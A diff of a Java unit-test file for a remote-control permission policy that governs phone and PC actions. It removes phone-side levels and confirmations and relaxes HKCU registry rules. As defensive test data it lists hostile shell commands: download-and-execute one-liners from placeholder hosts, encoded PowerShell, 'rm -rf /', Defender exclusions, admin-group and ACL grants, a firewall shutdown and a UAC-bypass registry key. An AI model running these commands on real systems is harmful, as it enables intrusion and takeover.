@@ -42,50 +42,64 @@ public class LinkPolicyTest {
 
     // ------------------------------------------------------------------ 级别矩阵
 
-    @Test public void phoneMatrix() {
+    /**
+     * [恢复手机] 改：手机作为被控端回到分档之前（「只看控制台上的逐项开关」）—— 不再有只读 / 自动 / 完全访问之分，
+     * 也不再在手机上弹确认、不按类别拦网址 / 剪贴板 / App。两条和分档无关的红线保留：给任何 App 授权只生成脚本、远程不能改 OneSay 自己的设置。
+     */
+    @Test public void phoneHasNoLevelsAnyMore() {
         Target t = Target.PHONE;
-        row(t, Cat.QUERY, A, A, A);
-        row(t, Cat.READ_PRIVATE, D, A, A);
-        row(t, Cat.HARMLESS, D, A, A);
-        row(t, Cat.SIMPLE_SETTING, D, A, A);       // 手机：简单设置自动档直接做
-        row(t, Cat.NET_SEC_SETTING, S, C, A);      // 手机：网络 / 安全设置先问后做（不是只生成脚本）
-        row(t, Cat.OPEN_APP, D, A, A);             // 开 App 不逐次确认
-        row(t, Cat.WORKSPACE_WRITE, D, A, A);
-        row(t, Cat.OUTSIDE_WRITE, S, C, A);        // 工作区以外：自动档先问
-        row(t, Cat.UNINSTALL_APP, D, C, C);        // 卸载在完全访问也要确认
-        row(t, Cat.APP_OPERATE, D, C, A);
-        row(t, Cat.RUN_WS_SCRIPT, D, D, C);
-        row(t, Cat.SHELL_EXEC, S, S, C);
+        for (Cat c : new Cat[]{Cat.QUERY, Cat.READ_PRIVATE, Cat.HARMLESS, Cat.SIMPLE_SETTING, Cat.NET_SEC_SETTING, Cat.OPEN_APP, Cat.OPEN_URL,
+                Cat.CLIPBOARD_WRITE, Cat.WORKSPACE_WRITE, Cat.OUTSIDE_WRITE, Cat.UNINSTALL_APP, Cat.APP_OPERATE, Cat.RUN_WS_SCRIPT, Cat.SHELL_EXEC})
+            row(t, c, A, A, A);
         row(t, Cat.SELF_GRANT, S, S, S);
-        row(t, Cat.SYSTEM_APP_OP, D, D, D);
+        row(t, Cat.SELF_AUTHORIZE, D, D, D);
         row(t, Cat.UNKNOWN, D, D, D);
+        // 信任检查的结果不再影响手机：网址 / 剪贴板 / 禁止类 App 都由手机端自己的开关和系统弹窗把关
+        Facts f = new Facts();
+        f.url = LinkPolicy.checkUrl("http://127.0.0.1/", TRUST);
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(t, AU, Cat.OPEN_URL, f).verdict);
+        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.decide(t, AU, Cat.SELF_AUTHORIZE, null).reason);
     }
 
-    @Test public void pcMatrixIsStrict() {
+    /** 电脑作为被控端（手机→电脑）：两轴。这里只按旧三档的映射走一遍，完整矩阵在电脑端 PcPluginTest 里。 */
+    @Test public void pcKeepsStrictMatrixThroughLegacyLevels() {
         Target t = Target.PC;
         row(t, Cat.QUERY, A, A, A);
         row(t, Cat.READ_PRIVATE, D, A, A);
         row(t, Cat.HARMLESS, D, A, A);
-        row(t, Cat.SIMPLE_SETTING, D, C, C);       // B 类：先问后做（完全访问也问）
+        row(t, Cat.SIMPLE_SETTING, D, C, C);
         row(t, Cat.POWER, D, C, C);
-        row(t, Cat.SYSTEM_A, S, S, S);             // A 类：任何级别都只生成脚本
+        row(t, Cat.SYSTEM_A, S, S, S);             // 要管理员：任何档位都只生成脚本
         row(t, Cat.NET_SEC_SETTING, S, S, S);
-        row(t, Cat.SHELL_EXEC, S, S, S);
-        row(t, Cat.OUTSIDE_WRITE, S, S, S);        // 完全访问不放开工作区以外
+        // [两轴] 改：只读档不再生成脚本（只读 = 什么都不写）；完全访问档按当前用户权限（命令先确认、工作区外直接写）
+        row(t, Cat.SHELL_EXEC, D, S, C);
+        row(t, Cat.OUTSIDE_WRITE, D, S, A);
         row(t, Cat.OPEN_APP, D, A, A);
         row(t, Cat.WORKSPACE_WRITE, D, A, A);
         row(t, Cat.UNINSTALL_APP, D, C, C);
-        row(t, Cat.APP_OPERATE, D, D, A);          // 完全访问只多出：操作第三方 App
-        row(t, Cat.RUN_WS_SCRIPT, D, D, C);        //               和运行工作区脚本（每次确认）
+        row(t, Cat.APP_OPERATE, D, D, A);
+        row(t, Cat.RUN_WS_SCRIPT, D, D, C);
         row(t, Cat.SELF_GRANT, S, S, S);
+        row(t, Cat.SELF_AUTHORIZE, D, D, D);       // [插件] 新：远程不能改 OneSay 自己的设置
         row(t, Cat.SYSTEM_APP_OP, D, D, D);
         row(t, Cat.UNKNOWN, D, D, D);
+        // 两轴本身
+        assertEquals(LinkPolicy.Sandbox.WORKSPACE_WRITE, LinkPolicy.Mode.DEFAULT.sandbox);
+        assertEquals(LinkPolicy.Approval.UNTRUSTED, LinkPolicy.Mode.DEFAULT.approval);
+        assertEquals(new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.ON_REQUEST), LinkPolicy.Mode.ofLegacy(FU));
+        assertEquals(Level.AUTO, LinkPolicy.Mode.DEFAULT.legacy());
+        assertEquals(Verdict.DENY, LinkPolicy.decide(t, new LinkPolicy.Mode(LinkPolicy.Sandbox.WORKSPACE_WRITE, LinkPolicy.Approval.NEVER), Cat.POWER, null).verdict);
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(t, new LinkPolicy.Mode(LinkPolicy.Sandbox.FULL_ACCESS, LinkPolicy.Approval.NEVER), Cat.POWER, null).verdict);
     }
 
     @Test public void deniedByLevelReasonCode() {
-        Decision d = LinkPolicy.decide(Target.PHONE, RO, Cat.HARMLESS, null);
+        // [恢复手机] 改：原来测的是手机只读档 denied_by_level，手机已经没有档位了；改成电脑端的同一条
+        Decision d = LinkPolicy.decide(Target.PC, RO, Cat.HARMLESS, null);
         assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, d.reason);
-        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, LinkPolicy.decide(Target.PC, FU, Cat.SYSTEM_A, null).reason);
+        // [插件] 改：要管理员的原因码换成 needs_admin_script（B.10）
+        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.decide(Target.PC, FU, Cat.SYSTEM_A, null).reason);
+        for (String code : new String[]{LinkPolicy.R_PLUGIN_BLOCKED, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.R_SELF_GRANT_BLOCKED})
+            assertFalse(code, LinkPolicy.reasonZh(code).isEmpty());
         assertEquals(Level.AUTO, Level.of(null));
         assertEquals(Level.AUTO, Level.of("garbage"));
         assertEquals(Level.FULL, Level.of("full"));
@@ -93,8 +107,9 @@ public class LinkPolicyTest {
         assertEquals(Level.AUTO, LinkPolicy.DEFAULT_LEVEL);
     }
 
+    /** [恢复手机] 改：禁止类 / 系统 App 的拦截只在电脑作被控端时生效（手机回到分档之前，由手机端自己的开关把关）。 */
     @Test public void blockedAndSystemAppsAtEveryLevel() {
-        for (Target t : Target.values()) {
+        for (Target t : new Target[]{Target.PC}) {
             for (Level l : Level.values()) {
                 Facts f = new Facts();
                 f.appBlocked = true;
@@ -112,7 +127,11 @@ public class LinkPolicyTest {
         // 系统 App 只是「打开」不算改动
         Facts sys = new Facts();
         sys.appSystem = true;
-        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, sys).verdict);
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_APP, sys).verdict);
+        // 手机端：不再按类别拦（恢复到分档之前）
+        Facts blocked = new Facts();
+        blocked.appBlocked = true;
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_APP, blocked).verdict);
     }
 
     @Test public void blockedAppList() {
@@ -149,18 +168,25 @@ public class LinkPolicyTest {
             assertEquals(n, Cat.SELF_GRANT, LinkPolicy.phoneSettingCat(n));
             for (Level l : Level.values()) assertEquals(Verdict.SCRIPT, v(Target.PHONE, l, LinkPolicy.phoneSettingCat(n)));
         }
+        // [插件] 新：远程想改 OneSay 自己的设置，两个被控端都拒
+        for (Target t : Target.values())
+            for (Level l : Level.values()) assertEquals(Verdict.DENY, v(t, l, Cat.SELF_AUTHORIZE));
         // 电脑上的授权类（ACL / Defender 排除 / 本地管理员组）同样只生成脚本
         for (String c : new String[]{"icacls C:\\x /grant Everyone:F", "Add-MpPreference -ExclusionPath C:\\", "net localgroup administrators bob /add"})
             assertEquals(c, Cat.SELF_GRANT, LinkPolicy.classifyShell(Target.PC, c));
     }
 
     @Test public void shellClassification() {
+        // [插件 / B.3] 改：HKCU 普通键现在放行（普通用户自己能做）；HKLM 等要管理员的仍是 SYSTEM_A（只生成脚本）
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "reg add HKLM\\Software\\X /v Y /d 1"));
+        assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "reg add HKCU\\Software\\MyApp /v Y /d 1"));
+        assertEquals("能影响提权的 HKCU 键仍然要管理员脚本", Cat.SYSTEM_A,
+                LinkPolicy.classifyShell(Target.PC, "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd /f"));
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "netsh advfirewall set allprofiles state off"));
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "Set-DnsClientServerAddress -InterfaceIndex 3 -ServerAddresses 8.8.8.8"));
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "sc config wuauserv start= disabled"));
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "notepad C:\\Windows\\System32\\drivers\\etc\\hosts"));
-        assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "Set-ItemProperty -Path HKCU:\\Software\\X -Name Y -Value 1"));
+        assertEquals("[插件] 改：HKCU 普通键放行", Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "Set-ItemProperty -Path HKCU:\\Software\\X -Name Y -Value 1"));
         assertEquals(Cat.SYSTEM_A, LinkPolicy.classifyShell(Target.PC, "pnputil /add-driver x.inf"));
         assertEquals(Cat.SHELL_EXEC, LinkPolicy.classifyShell(Target.PC, "dir C:\\"));
         assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.classifyShell(Target.PHONE, "settings put system screen_brightness 120"));
@@ -183,6 +209,7 @@ public class LinkPolicyTest {
         assertEquals(Cat.QUERY, LinkPolicy.phoneCat("status"));
         assertEquals(Cat.UNKNOWN, LinkPolicy.phoneCat("rm_rf"));
         assertEquals("电脑快捷指令单独一类", Cat.SHORTCUT, LinkPolicy.pcCat("shortcut_run"));
+        assertEquals("[插件] 新：远程想改电脑端自己的设置", Cat.SELF_AUTHORIZE, LinkPolicy.pcCat("settings"));
         assertEquals(Cat.RUN_WS_SCRIPT, LinkPolicy.pcCat("script_run"));
         assertEquals(Cat.POWER, LinkPolicy.pcCat("shutdown"));
         assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.pcCat("volume"));
@@ -242,22 +269,23 @@ public class LinkPolicyTest {
         assertTrue("真正的俄语域名（有不像拉丁的字母）不算仿冒", LinkPolicy.checkUrl("https://\u043f\u0440\u0438\u043c\u0435\u0440.\u0440\u0444/", TRUST).ok);
     }
 
+    /** [恢复手机] 改：网址 / 剪贴板的判定现在只在电脑作被控端时生效，断言里的 Target 从 PHONE 换成 PC；检查函数本身没变。 */
     @Test public void urlTrustDecisions() {
         Facts f = new Facts();
         f.url = LinkPolicy.checkUrl("https://www.bilibili.com/video/1", TRUST);
         assertTrue(f.url.trusted);
-        assertEquals("信任域名（含子域）自动档直接开", Verdict.ALLOW, LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_URL, f).verdict);
+        assertEquals("信任域名（含子域）自动档直接开", Verdict.ALLOW, LinkPolicy.decide(Target.PC, AU, Cat.OPEN_URL, f).verdict);
         f.url = LinkPolicy.checkUrl("https://evilbilibili.com/", TRUST);
         assertFalse("后缀相同但不是子域", f.url.trusted);
-        Decision d = LinkPolicy.decide(Target.PHONE, AU, Cat.OPEN_URL, f);
+        Decision d = LinkPolicy.decide(Target.PC, AU, Cat.OPEN_URL, f);
         assertEquals(Verdict.CONFIRM, d.verdict);
         assertTrue("确认里突出域名", d.text.contains("evilbilibili.com"));
-        Decision full = LinkPolicy.decide(Target.PHONE, FU, Cat.OPEN_URL, f);
-        assertEquals(Verdict.ALLOW, full.verdict);
+        Decision full = LinkPolicy.decide(Target.PC, FU, Cat.OPEN_URL, f);
+        assertEquals(Verdict.ALLOW, full.verdict); // 完全访问 = 按需审批：不问，只提醒
         assertTrue("完全访问：不在信任列表也提个醒", full.headsUp);
-        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PHONE, RO, Cat.OPEN_URL, f).verdict);
+        assertEquals(Verdict.DENY, LinkPolicy.decide(Target.PC, RO, Cat.OPEN_URL, f).verdict);
         f.url = LinkPolicy.checkUrl("javascript:alert(1)", TRUST);
-        for (Level l : new Level[]{AU, FU}) assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(Target.PHONE, l, Cat.OPEN_URL, f).reason);
+        for (Level l : new Level[]{AU, FU}) assertEquals(LinkPolicy.R_UNTRUSTED_URL, LinkPolicy.decide(Target.PC, l, Cat.OPEN_URL, f).reason);
         assertEquals(Arrays.asList("bilibili.com", "xn--fsqu00a.xn--fiqs8s", "a.b"), LinkPolicy.parseDomains("https://bilibili.com/x, *.bilibili.com\n例子.中国 a.b"));
     }
 
@@ -302,12 +330,12 @@ public class LinkPolicyTest {
         // 判定：敏感 → 完全访问也要确认；普通 → 自动档确认、完全访问直接写；拒绝 → clipboard_rejected
         Facts f = new Facts();
         f.clip = LinkPolicy.checkClip("482913");
-        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PHONE, FU, Cat.CLIPBOARD_WRITE, f).verdict);
+        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
         f.clip = LinkPolicy.checkClip("hello");
-        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PHONE, AU, Cat.CLIPBOARD_WRITE, f).verdict);
-        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PHONE, FU, Cat.CLIPBOARD_WRITE, f).verdict);
+        assertEquals(Verdict.CONFIRM, LinkPolicy.decide(Target.PC, AU, Cat.CLIPBOARD_WRITE, f).verdict);
+        assertEquals(Verdict.ALLOW, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).verdict);
         f.clip = LinkPolicy.checkClip("rm -rf /");
-        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, LinkPolicy.decide(Target.PHONE, FU, Cat.CLIPBOARD_WRITE, f).reason);
+        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, LinkPolicy.decide(Target.PC, FU, Cat.CLIPBOARD_WRITE, f).reason);
         assertTrue(LinkPolicy.luhn("4111111111111111"));
         assertFalse(LinkPolicy.luhn("4111111111111112"));
     }
@@ -399,50 +427,10 @@ public class LinkPolicyTest {
         assertEquals(Collections.<String>emptyList(), LinkPolicy.listScripts(tmpDir()));
     }
 
-    // ------------------------------------------------------------------ PcRx 接上执行级别（JVM 桩）
-
-    static final class GateStub implements PcRx.Handler, PcRx.Gate {
-        Level level = Level.AUTO;
-        int confirmAnswer = PcRx.CONFIRM_TIMEOUT;
-        final List<String> ran = new ArrayList<String>(), confirms = new ArrayList<String>(), scripts = new ArrayList<String>(), heads = new ArrayList<String>();
-        final List<String> trusted = new ArrayList<String>(Arrays.asList("bilibili.com"));
-        File ws;
-        Map<String, Object> lastArgs;
-
-        GateStub() throws Exception { ws = tmpDir(); }
-
-        @Override public boolean enabled(String cmd) { return true; }
-        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
-            ran.add(cmd);
-            lastArgs = args;
-            return new PcLanClient.Result(true, "好", null, "");
-        }
-        @Override public void record(String cmd, boolean ok, String text) { }
-        @Override public Level level() { return level; }
-        @Override public File workspace() { return ws; }
-        @Override public Facts facts(String cmd, Map<String, Object> a, Cat cat) {
-            Facts f = new Facts();
-            if ("open_url".equals(cmd)) f.url = LinkPolicy.checkUrl(PcRxPolicy.str(a, "url"), trusted);
-            if ("clipboard_set".equals(cmd)) f.clip = LinkPolicy.checkClip(String.valueOf(a.get("text")));
-            if ("open_app".equals(cmd) || "uninstall_app".equals(cmd)) {
-                f.appBlocked = LinkPolicy.blockedApp(PcRxPolicy.str(a, "package"), PcRxPolicy.str(a, "name"));
-                f.appSystem = PcRxPolicy.str(a, "package").startsWith("com.android.");
-            }
-            return f;
-        }
-        @Override public int confirm(String cmd, String title, String detail, long timeoutMs) {
-            confirms.add(cmd + ":" + detail);
-            assertEquals(30000L, timeoutMs);
-            return confirmAnswer;
-        }
-        @Override public String script(String cmd, Map<String, Object> a, String why) {
-            LinkPolicy.Script s = LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "test", PcRxPolicy.str(a, "command"), System.currentTimeMillis());
-            String rel = LinkPolicy.writeScript(ws, s);
-            scripts.add(rel);
-            return rel;
-        }
-        @Override public void headsUp(String cmd, String text) { heads.add(cmd); }
-    }
+    // ------------------------------------------------------------------ [恢复手机] 删：PcRx.Gate / ConfirmBox 相关
+    // 原来这里有 GateStub（桩）、gatedHandleReasonCodes、confirmBoxTimeoutIsDeny，测的是手机端的执行级别（级别矩阵 / 手机上确认 /
+    // 生成脚本 / 新增 8 个指令）。手机恢复到分档之前后 PcRx.Gate 和 ConfirmBox 都不存在了，这两项没有被测对象，删除；
+    // 手机端现在的行为（只看逐项开关）由下面这项和 PcLinkV2Test 覆盖。
 
     static Map<String, Object> m(Object... kv) {
         Map<String, Object> x = new TreeMap<String, Object>();
@@ -450,115 +438,19 @@ public class LinkPolicyTest {
         return x;
     }
 
-    static String reason(PcLanClient.Result r) {
-        return String.valueOf(r.data.get("reason"));
-    }
-
-    @Test public void gatedHandleReasonCodes() throws Exception {
-        GateStub g = new GateStub();
-        // caps 带级别和新指令
-        PcLanClient.Result caps = PcRx.handle(g, "caps", null);
-        assertEquals("auto", caps.data.get("level"));
-        assertTrue(String.valueOf(caps.data.get("caps")).contains("flashlight"));
-
-        g.level = Level.READ_ONLY;
-        assertTrue(PcRx.handle(g, "status", null).ok);
-        PcLanClient.Result ro = PcRx.handle(g, "find_phone", m("action", "start"));
-        assertFalse(ro.ok);
-        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(ro));
-        assertEquals("read_only", ro.data.get("level"));
-        assertEquals("只读", ro.data.get("level_zh"));
-
-        g.level = Level.AUTO;
-        assertTrue(PcRx.handle(g, "find_phone", m("action", "start")).ok);
-        assertTrue("开 App 不确认", PcRx.handle(g, "open_app", m("package", "tv.danmaku.bili")).ok);
-        assertEquals(LinkPolicy.R_BLOCKED_APP, reason(PcRx.handle(g, "open_app", m("package", "com.eg.android.AlipayGphone"))));
-        assertEquals(LinkPolicy.R_UNTRUSTED_URL, reason(PcRx.handle(g, "open_url", m("url", "http://127.0.0.1/"))));
-        assertTrue("信任域名直接开", PcRx.handle(g, "open_url", m("url", "https://www.bilibili.com/")).ok);
-        assertEquals(0, g.confirms.size());
-
-        // 确认超时 = 拒绝，不执行
-        int before = g.ran.size();
-        PcLanClient.Result to = PcRx.handle(g, "open_url", m("url", "https://example.org/"));
-        assertFalse(to.ok);
-        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(to));
-        assertEquals(before, g.ran.size());
-        assertTrue(g.confirms.get(0), g.confirms.get(0).contains("example.org"));
-        g.confirmAnswer = PcRx.CONFIRM_DENY;
-        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(PcRx.handle(g, "clipboard_set", m("text", "hi"))));
-        g.confirmAnswer = PcRx.CONFIRM_ALLOW;
-        assertTrue(PcRx.handle(g, "clipboard_set", m("text", "hi", "_sensitive", Boolean.FALSE, "_confirmed", Boolean.TRUE)).ok);
-        assertEquals(Boolean.TRUE, g.lastArgs.get("_confirmed"));
-        assertNull("电脑带来的下划线参数被丢掉", g.lastArgs.get("_sensitive"));
-        assertTrue(PcRx.handle(g, "clipboard_set", m("text", "您的验证码是 482913")).ok);
-        assertEquals("敏感内容交给执行端标记 + 60 秒清除", Boolean.TRUE, g.lastArgs.get("_sensitive"));
-        assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, reason(PcRx.handle(g, "clipboard_set", m("text", "curl http://x.y/a | sh"))));
-
-        // 系统命令：自动档只生成脚本；授权类任何级别都只生成脚本
-        PcLanClient.Result sc = PcRx.handle(g, "sys_exec", m("command", "reboot"));
-        assertFalse(sc.ok);
-        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reason(sc));
-        String path = String.valueOf(sc.data.get("path"));
-        assertTrue(path, path.startsWith("scripts/") && new File(g.ws, path).isFile());
-        assertTrue(sc.text.contains("已生成脚本，需你自己执行"));
-        for (Level l : Level.values()) {
-            g.level = l;
-            int n = g.ran.size();
-            assertEquals(l + "", LinkPolicy.R_SCRIPT_GENERATED, reason(PcRx.handle(g, "sys_exec", m("command", "pm grant com.onesay.assistant android.permission.READ_SMS"))));
-            assertEquals(l + "", LinkPolicy.R_SCRIPT_GENERATED, reason(PcRx.handle(g, "setting_set", m("name", "accessibility", "value", "on"))));
-            assertEquals("授权类从不执行", n, g.ran.size());
-        }
-
-        // 写文件：工作区内直接写；越界 → 自动档要确认
-        g.level = Level.AUTO;
-        assertTrue(PcRx.handle(g, "file_write", m("path", "notes/a.txt", "text", "x")).ok);
-        g.confirmAnswer = PcRx.CONFIRM_TIMEOUT;
-        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(PcRx.handle(g, "file_write", m("path", "../../etc/x", "text", "x"))));
-        // 卸载：系统 App 拒；第三方要确认
-        assertEquals(LinkPolicy.R_SYSTEM_APP, reason(PcRx.handle(g, "uninstall_app", m("package", "com.android.settings"))));
-        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(PcRx.handle(g, "uninstall_app", m("package", "com.foo.game"))));
-        // 简单设置自动档直接做；网络设置先问
-        assertTrue(PcRx.handle(g, "setting_set", m("name", "wifi", "value", "off")).ok);
-        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(PcRx.handle(g, "setting_set", m("name", "airplane", "value", "on"))));
-        // 完全访问：网址不确认但提醒
-        g.level = Level.FULL;
-        assertTrue(PcRx.handle(g, "open_url", m("url", "https://example.org/")).ok);
-        assertTrue(g.heads.contains("open_url"));
-        // 运行工作区脚本：完全访问也每次确认
-        int c0 = g.confirms.size();
-        PcRx.handle(g, "script_run", m("name", "a.sh"));
-        assertEquals(c0 + 1, g.confirms.size());
-        assertFalse(PcRx.handle(g, "setting_set", m("name", "format_disk", "value", "1")).ok);
-    }
-
     @Test public void legacyHandlerWithoutGateKeepsOldBehaviour() {
         PcLinkV2Test.Stub h = new PcLinkV2Test.Stub();
         assertFalse("旧执行端不认新指令", PcRx.handle(h, "flashlight", null).ok);
         assertTrue(PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
-    }
-
-    @Test public void confirmBoxTimeoutIsDeny() throws Exception {
-        final PcRx.ConfirmBox box = new PcRx.ConfirmBox();
-        int id = box.open();
-        long t0 = System.currentTimeMillis();
-        assertEquals(PcRx.CONFIRM_TIMEOUT, box.await(id, 200));
-        assertTrue(System.currentTimeMillis() - t0 >= 150);
-        assertFalse("超时后再点允许也不算", box.resolve(id, true));
-        assertEquals(0, box.size());
-
-        final int id2 = box.open();
-        new Thread(new Runnable() {
-            @Override public void run() {
-                try { Thread.sleep(50); } catch (InterruptedException ignored) { }
-                box.resolve(id2, true);
-            }
-        }).start();
-        assertEquals(PcRx.CONFIRM_ALLOW, box.await(id2, 5000));
-        int id3 = box.open();
-        assertTrue(box.resolve(id3, false));
-        assertFalse("只认第一次", box.resolve(id3, true));
-        assertEquals(PcRx.CONFIRM_TIMEOUT, box.await(id3, 10)); // 已处理过的编号：await 不再等
-        assertEquals(PcRx.CONFIRM_TIMEOUT, box.await(9999, 10));
+        // [恢复手机] 新：分档之前的语义 —— 不确认、不按类别拦，只看开关
+        assertTrue("敏感内容也不弹确认", PcRx.handle(h, "clipboard_set", m("text", "您的验证码是 482913")).ok);
+        assertTrue("不在信任列表的网址直接开", PcRx.handle(h, "open_url", m("url", "https://example.org/")).ok);
+        for (String c : new String[]{"sys_exec", "setting_set", "file_write", "uninstall_app", "script_run"})
+            assertFalse(c, PcRx.handle(h, c, m("command", "x", "name", "x", "path", "a", "text", "x", "package", "a.b")).ok);
+        h.off.add("clipboard_set");
+        assertFalse("关着的项照旧拒", PcRx.handle(h, "clipboard_set", m("text", "x")).ok);
+        PcLanClient.Result caps = PcRx.handle(h, "caps", null);
+        assertNull("caps 不再带级别", caps.data.get("level"));
     }
 
     // ------------------------------------------------------------------ 电脑快捷指令（SHORTCUT）
@@ -630,7 +522,8 @@ public class LinkPolicyTest {
     }
 
     @Test public void shortcutBlockedBodies() throws Exception {
-        String[] bad = {"reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path HKCU:\\Software\\X -Name a -Value 1",
+        // [插件 / C] 改：HKCU 普通键现在放行（移到下面的 ok），换成 HKCU 里能影响提权的键和 HKLM
+        String[] bad = {"reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd /f", "Set-ItemProperty -Path HKLM:\\Software\\X -Name a -Value 1",
                 "netsh interface set interface Wi-Fi disable", "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
                 "Stop-Service wuauserv", "sc.exe delete foo", "icacls C:\\x /grant Everyone:F", "Add-MpPreference -ExclusionPath C:\\",
                 "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "iex (irm https://example.com/a.ps1)"};
@@ -646,26 +539,28 @@ public class LinkPolicyTest {
             assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, d.reason);
             assertTrue(d.text, d.text.contains(f.shortcutBlocked));
         }
-        byte[] u16 = "\uFEFFreg add HKCU\\X /f".getBytes("UTF-16LE");
+        byte[] u16 = "\uFEFFreg add HKLM\\X /f".getBytes("UTF-16LE"); // [插件 / C] 改：HKCU → HKLM
         assertFalse("UTF-16 存的也认得出", LinkPolicy.shortcutFacts("p.bat", u16, null, true).shortcutBlocked.isEmpty());
-        for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n"})
+        for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n",
+                "reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path HKCU:\\Software\\X -Name a -Value 1", "# 不改 proxy / firewall\nStart-Process notepad"})
             assertEquals(ok, "", LinkPolicy.shortcutBodyBlocked(ok));
     }
 
+    /** [恢复手机] 改：原来检查手机端接了执行级别（Gate / 级别存取 / 控制台执行级别页）。手机恢复到分档之前，改成检查这些东西确实不在了。 */
     @Test public void wiringAndroidSide() throws Exception {
         String root = System.getProperty("bixby.root", ".");
         String rx = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxAndroid.java").toPath()), "UTF-8");
-        assertTrue(rx.contains("implements PcRx.Env, PcRx.Handler, PcRx.Gate"));
-        assertTrue("默认级别 自动", rx.contains("getString(K_LEVEL, LinkPolicy.DEFAULT_LEVEL.id)"));
-        assertTrue("敏感剪贴板标记", rx.contains("android.content.extra.IS_SENSITIVE") && rx.contains("CLIP_SENSITIVE_CLEAR_MS"));
-        assertTrue("确认广播带口令", rx.contains("getLongExtra(\"tok\", 0) != CONFIRM_TOKEN"));
-        assertTrue("工作区在 App 专属存储", rx.contains("getExternalFilesDir(\"workspace\")"));
-        assertTrue("卸载走系统卸载界面", rx.contains("Intent.ACTION_DELETE"));
+        assertTrue("手机端只实现 Env / Handler，没有执行级别", rx.contains("implements PcRx.Env, PcRx.Handler"));
+        assertFalse("没有 Gate", rx.contains("PcRx.Gate"));
+        assertFalse("没有执行级别存取", rx.contains("K_LEVEL") || rx.contains("levelOf("));
         assertFalse("从不自己授权", rx.contains("\"pm grant") || rx.contains("ACTION_MANAGE_WRITE_SETTINGS") || rx.contains("ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS"));
+        String pol = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxPolicy.java").toPath()), "UTF-8");
+        assertFalse("没有只受级别管的新指令", pol.contains("EXTRA") || pol.contains("sys_exec"));
+        String rxc = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRx.java").toPath()), "UTF-8");
+        assertFalse("没有 Gate / ConfirmBox", rxc.contains("interface Gate") || rxc.contains("ConfirmBox"));
         String ui = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcLinkUi.java").toPath()), "UTF-8");
-        assertTrue(ui.contains("buildLevel(host, root, act);"));
-        assertTrue("完全访问要二次确认", ui.contains("打开完全访问？") && ui.contains("我了解风险，打开"));
-        assertTrue("快捷指令可能要电脑上批准：手机多等", ui.contains("cat == LinkPolicy.Cat.SHORTCUT"));
+        assertFalse("控制台没有执行级别页", ui.contains("buildLevel(") || ui.contains("打开完全访问？"));
+        assertTrue("电脑上可能要确认的指令手机多等（快捷指令 40 秒保留）", ui.contains("cat == LinkPolicy.Cat.SHORTCUT") && ui.contains("40000"));
